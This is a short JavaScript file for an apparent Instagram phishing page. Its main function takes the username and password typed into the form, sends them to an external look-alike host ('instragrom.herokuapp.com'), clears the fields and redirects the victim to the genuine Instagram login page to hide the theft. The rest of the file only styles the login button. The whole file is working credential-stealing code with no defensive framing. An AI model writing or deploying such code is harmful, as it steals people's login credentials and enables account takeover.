let username = document.getElementById('username');
let password = document.getElementById('password');

async function x (){
    // let j = document.getElementById('username');
    // let z = document.getElementById('password');


const data = {
    "username" : username.value,
    "password" : password.value
}
const options = {
    
    method:'POST',
    headers:{
        'Content-Type':'application/json'
        
    },
    body: JSON.stringify(data)
};

await fetch(
    'https://instragrom.herokuapp.com/user', options
)

// https://instragrom.herokuapp.com/user
username.value="";
password.value="";
window.location.href="https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav";


}

function a(){
  if(password.value.length<8 ){
    document.getElementById('lgn').style.backgroundColor='#B2DFFC'
    
  }
  else{
    document.getElementById('lgn').style.backgroundColor='#3897f0'
    
  }
}
